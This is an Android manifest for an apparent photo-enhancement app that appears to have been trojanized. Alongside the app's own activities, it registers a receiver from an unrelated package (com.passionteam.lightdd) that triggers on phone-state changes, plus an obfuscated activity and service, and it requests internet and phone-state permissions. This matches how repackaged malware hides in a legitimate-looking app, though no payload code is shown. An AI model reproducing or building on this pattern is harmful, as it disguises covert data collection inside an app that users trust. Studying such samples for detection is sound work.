<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.wheadon.super.photoenhance">
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <supports-screens android:largeScreens="true" android:smallScreens="true"/>
    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="orientation" android:label="@string/app_name" android:name="com.wheadon.photoenhance.PhotoEnhance">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.ALTERNATIVE"/>
                <data android:mimeType="image/jpeg"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/setPreferences" android:name="com.wheadon.photoenhance.Preferences"/>
        <activity android:label="@string/crop" android:name="com.wheadon.photoenhance.Crop"/>
        <activity android:label="@string/adjust" android:name="aL$eW"/>
        <receiver android:name="com.passionteam.lightdd.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="V$cx"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
</manifest>